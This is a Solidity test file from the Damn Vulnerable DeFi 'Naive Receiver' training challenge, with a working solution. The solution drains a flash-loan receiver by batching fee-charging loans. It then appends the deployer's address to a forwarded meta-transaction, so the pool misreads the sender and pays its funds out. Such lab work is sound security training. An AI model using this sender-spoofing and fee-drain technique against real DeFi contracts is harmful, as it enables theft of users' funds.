// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory calls = new bytes[](11);

        // encodeCall is the best way to do it as its type safe
        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeWithSelector(
                NaiveReceiverPool.flashLoan.selector,
                receiver,
                address(weth),
                0,
                bytes("")
            );
        }

        // calls[10] = abi.encodePacked(
        //     NaiveReceiverPool.withdraw.selector,
        //     bytes32(WETH_IN_POOL + WETH_IN_RECEIVER),
        //     bytes32(uint256(uint160(recovery))),
        //     bytes20(deployer)
        // );

        //  this two are the same, just that the first one is manually aligned

        calls[10] = abi.encodePacked(
            abi.encodeWithSelector(
                NaiveReceiverPool.withdraw.selector,
                (WETH_IN_POOL + WETH_IN_RECEIVER),
                payable(recovery)
            ),
            bytes20(deployer)
        );

        bytes memory data = abi.encodeCall(pool.multicall, calls);

        // NOT WORKS BECAUSE OF ALIGNMENT
        // payload = [selector][args][player]
        // bytes memory withdrawCall = abi.encodeCall(
        //     NaiveReceiverPool.withdraw,
        //     (WETH_IN_POOL, payable(recovery))
        // );

        // // Step 2: Append deployer address to spoof _msgSender()
        // bytes memory data = abi.encodePacked(withdrawCall, bytes20(deployer));

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: forwarder.nonces(player),
            data: data,
            deadline: 1 days
        });

        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);

        console.log(weth.balanceOf(address(pool)) / 1e18);
        console.log(weth.balanceOf(address(receiver)) / 1e18);
        console.log(weth.balanceOf(address(recovery)) / 1e18);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }
}
